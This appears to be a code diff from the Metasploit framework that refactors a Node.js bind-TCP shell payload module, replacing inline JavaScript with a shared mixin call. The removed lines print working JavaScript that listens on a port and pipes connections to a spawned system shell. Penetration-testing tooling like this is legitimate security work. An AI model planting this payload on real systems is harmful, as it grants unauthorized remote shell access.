@@ -10,12 +10,14 @@
 # settle for just getting shells on nodejs.
 
 require 'msf/core'
+require 'msf/core/payload/nodejs'
 require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 
 module Metasploit3
 
   include Msf::Payload::Single
+  include Msf::Payload::NodeJS
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
@@ -44,25 +46,6 @@ module Metasploit3
   # Returns the JS string to use for execution
   #
   def command_string
-    cmd   = <<EOS
-(function(){
-  var require = global.require || global.process.mainModule.constructor._load;
-  if (!require) return;
-
-  var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh";
-  var net = require("net"),
-      cp = require("child_process"),
-      util = require("util");
-
-  var server = net.createServer(function(socket) {  
-    var sh = cp.spawn(cmd, []);
-    socket.pipe(sh.stdin);
-    util.pump(sh.stdout, socket);
-    util.pump(sh.stderr, socket);
-  });
-  server.listen(#{datastore['LPORT']});
-})();
-EOS
-    return "#{cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')}"
+    nodejs_bind_tcp
   end
 end
